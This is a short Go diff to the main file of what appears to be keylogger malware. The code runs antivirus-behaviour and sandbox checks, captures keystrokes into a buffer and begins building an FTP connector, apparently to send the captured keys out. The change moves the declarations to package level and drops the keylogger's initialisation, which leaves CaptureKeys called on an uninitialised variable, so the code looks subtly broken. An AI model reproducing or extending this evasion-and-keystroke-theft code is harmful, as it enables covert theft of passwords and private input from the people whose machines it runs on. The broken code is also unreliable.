@@ -2,7 +2,6 @@ package main
 
 import (
 	"bytes"
-	"runtime"
 	"time"
 
 	"github.com/adelapazborrero/logger/connector"
@@ -20,14 +19,13 @@ const (
 	LOG_BUFFER_SIZE = 1024
 )
 
+var logBuffer *bytes.Buffer
+var keyLogger *keys.KeyLoggerService
+
 func main() {
 	utils.AVBehaviourCheck()
 	utils.SandboxCheck()
 
-	var logBuffer *bytes.Buffer
-
-	keyLogger := keys.NewKeyLoggerService(runtime.GOOS)
-	keyLogger.InitLogger()
 	keyLogger.CaptureKeys(logBuffer)
 
 	ftp := connector.NewFTP(
